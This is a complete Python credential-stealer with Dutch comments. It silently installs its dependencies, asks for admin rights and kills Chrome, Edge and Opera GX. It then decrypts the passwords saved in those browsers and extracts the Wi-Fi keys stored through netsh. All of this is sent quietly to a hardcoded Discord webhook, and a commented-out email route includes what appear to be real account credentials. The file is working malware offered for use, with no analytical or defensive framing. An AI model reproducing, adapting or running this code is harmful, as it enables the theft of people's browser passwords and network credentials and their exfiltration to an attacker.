import subprocess
import sys
import os
import shutil
import sqlite3
import base64
import json
import ctypes
import threading
from datetime import datetime, timedelta
from Crypto.Cipher import AES
import win32crypt
import requests
import yagmail
import time

# Stil installeren van packages indien nodig
def silent_install(package_name, import_name=None):
    if import_name is None:
        import_name = package_name
    try:
        __import__(import_name)
    except ImportError:
        subprocess.run(
            [sys.executable, "-m", "pip", "install", package_name],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            stdin=subprocess.DEVNULL
        )

packages = [
    ("pycryptodome", "Crypto"),
    ("pypiwin32", "win32crypt"),
    ("requests",),
    ("yagmail",),
]

for pkg_name, *rest in packages:
    import_name = rest[0] if rest else None
    silent_install(pkg_name, import_name)

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except Exception:
        return False

if not is_admin():
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1)
    sys.exit()

def get_browser_paths():
    local_appdata = os.environ.get("LOCALAPPDATA")
    appdata = os.environ.get("APPDATA")
    return {
        "Chrome": os.path.join(local_appdata, r"Google\Chrome\User Data"),
        "Edge": os.path.join(local_appdata, r"Microsoft\Edge\User Data"),
        "Opera GX": os.path.join(appdata, r"Opera Software\Opera GX Stable"),
    }

PROCESS_NAMES = {
    "Chrome": ["chrome"],
    "Edge": ["msedge"],
    "Opera GX": ["opera", "opera_gx"],
}

def find_login_data_files(base_path):
    files = []
    if not base_path or not os.path.exists(base_path):
        return files
    for root, dirs, filenames in os.walk(base_path):
        if "Login Data" in filenames:
            login_db = os.path.join(root, "Login Data")
            profile = os.path.basename(root)
            files.append((profile, login_db))
    return files

def get_master_key(local_state_path):
    try:
        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]  # "DPAPI" prefix verwijderen
        master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        return None

def decrypt_password(ciphertext, master_key):
    try:
        if ciphertext.startswith(b'v10'):
            nonce = ciphertext[3:15]
            ciphertext_body = ciphertext[15:-16]
            tag = ciphertext[-16:]
            cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
            decrypted = cipher.decrypt_and_verify(ciphertext_body, tag)
            return decrypted.decode(errors="ignore")
        else:
            decrypted = win32crypt.CryptUnprotectData(ciphertext, None, None, None, 0)[1]
            return decrypted.decode(errors="ignore")
    except Exception:
        return ""

def kill_browser_processes(browser_name):
    procs = PROCESS_NAMES.get(browser_name, [])
    for proc in procs:
        try:
            subprocess.run(f"taskkill /f /im {proc}.exe", shell=True,
                           stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        except Exception:
            pass

def process_browser(browser_name, base_path):
    results = []
    if not base_path or not os.path.exists(base_path):
        return results

    local_state_path = os.path.join(base_path, "Local State")
    if not os.path.exists(local_state_path):
        return results

    master_key = get_master_key(local_state_path)
    if not master_key:
        return results

    profiles = find_login_data_files(base_path)
    if not profiles:
        return results

    kill_browser_processes(browser_name)

    for profile, login_db in profiles:
        temp_db = f"{browser_name.lower()}_{profile}_temp.db"
        try:
            shutil.copy2(login_db, temp_db)
        except Exception:
            continue

        try:
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value, date_last_used FROM logins")
            entries = cursor.fetchall()
            conn.close()
            os.remove(temp_db)
        except Exception:
            continue

        for url, username, encrypted_pw, last_used in entries:
            if not username.strip():
                continue
            pw = decrypt_password(encrypted_pw, master_key)
            if not pw:
                continue
            try:
                if last_used and last_used != 0:
                    last_used_dt = datetime(1601, 1, 1) + timedelta(microseconds=last_used)
                    last_used_str = last_used_dt.strftime("%Y-%m-%d %H:%M:%S")
                else:
                    last_used_str = "Onbekend"
            except Exception:
                last_used_str = "Onbekend"

            url_clean = url.strip()

            entry_text = (
                f"{browser_name} profiel: {profile}\n"
                f"URL: {url_clean}\n"
                f"Gebruiker: {username}\n"
                f"Wachtwoord: {pw}\n"
                f"Laatst gebruikt: {last_used_str}\n"
                + "-"*40
            )
            results.append(entry_text)
    return results

def get_wifi_passwords():
    results = []
    try:
        output = subprocess.check_output('netsh wlan show profiles', shell=True, text=True, encoding='utf-8')
        profiles = [line.split(":")[1].strip() for line in output.splitlines() if "All User Profile" in line]
        for ssid in profiles:
            try:
                profile_info = subprocess.check_output(f'netsh wlan show profile "{ssid}" key=clear',
                                                       shell=True, text=True, encoding='utf-8')
                password = None
                for line in profile_info.splitlines():
                    if "Key Content" in line:
                        password = line.split(":")[1].strip()
                        break
                if password:
                    results.append(f"SSID: {ssid}\nWachtwoord: {password}\n" + "-"*40)
            except Exception:
                continue
    except Exception:
        pass
    return results

def send_message_in_chunks(content, webhook_url, max_len=2000):
    while content:
        if len(content) > max_len:
            split_pos = content.rfind('\n', 0, max_len)
            if split_pos == -1:
                split_pos = max_len
            part = content[:split_pos]
            content = content[split_pos:].lstrip('\n')
        else:
            part = content
            content = ""

        message_part = f"```text\n{part}\n```"
        data = {"content": message_part}
        try:
            resp = requests.post(webhook_url, json=data)
            if resp.status_code not in [200, 204]:
                with open("webhook_errors.log", "a") as f:
                    f.write(f"{datetime.now()} - Webhook error: {resp.status_code} {resp.text}\n")
            time.sleep(1)
        except Exception as e:
            with open("webhook_errors.log", "a") as f:
                f.write(f"{datetime.now()} - Webhook send failed: {e}\n")

def send_webhook_messages_per_section(wifi_pwds, browser_data, webhook_url):
    wifi_message = "=== WIFI WACHTWOORDEN ===\n"
    if wifi_pwds:
        wifi_message += "\n".join(wifi_pwds)
    else:
        wifi_message += "Geen wifi wachtwoorden gevonden."
    send_message_in_chunks(wifi_message, webhook_url)

    for browser, entries in browser_data:
        browser_message = f"=== {browser} WACHTWOORDEN ===\n"
        if entries:
            browser_message += "\n".join(entries)
        else:
            browser_message += "Geen wachtwoorden gevonden."
        send_message_in_chunks(browser_message, webhook_url)

def send_email(subject, content, sender_email, sender_password, recipient_email):
    try:
        yag = yagmail.SMTP(sender_email, sender_password)
        yag.send(to=recipient_email, subject=subject, contents=content)
    except Exception as e:
        with open("email_errors.log", "a") as f:
            f.write(f"{datetime.now()} - Email send failed: {e}\n")

def main_thread():
    try:
        browsers = get_browser_paths()
        all_browser_data = []
        for browser, path in browsers.items():
            data = process_browser(browser, path)
            all_browser_data.append((browser, data))

        wifi_pwds = get_wifi_passwords()

        bericht = "=== WIFI WACHTWOORDEN ===\n"
        if wifi_pwds:
            bericht += "\n".join(wifi_pwds)
        else:
            bericht += "Geen wifi wachtwoorden gevonden."
        bericht += "\n\n"

        for browser, entries in all_browser_data:
            bericht += f"=== {browser} WACHTWOORDEN ===\n"
            if entries:
                bericht += "\n".join(entries)
            else:
                bericht += "Geen wachtwoorden gevonden."
            bericht += "\n\n"

        webhook_url = "https://discord.com/api/webhooks/1385551412544405535/jXp6EDB1dMSrBJTpLrZdHcmcOHr7tOL61302mRdQirmBXWf-sdTq6VQT3oFt1za4k_zs"  # Vervang door je webhook URL

        # Stuur via webhook, stil zonder print
        send_message_in_chunks(bericht, webhook_url)

        # Optioneel: verstuur ook per email (zonder output)
        #send_email("Wachtwoorden", bericht, "keirsbilckciel90@gmail.com", "slsn hvoj mcej edug", "cielkeirsbilck22@gmail.com")

    except Exception as e:
        with open("main_errors.log", "a") as f:
            f.write(f"{datetime.now()} - Main thread failed: {e}\n")

if __name__ == "__main__":
    threading.Thread(target=main_thread).start()
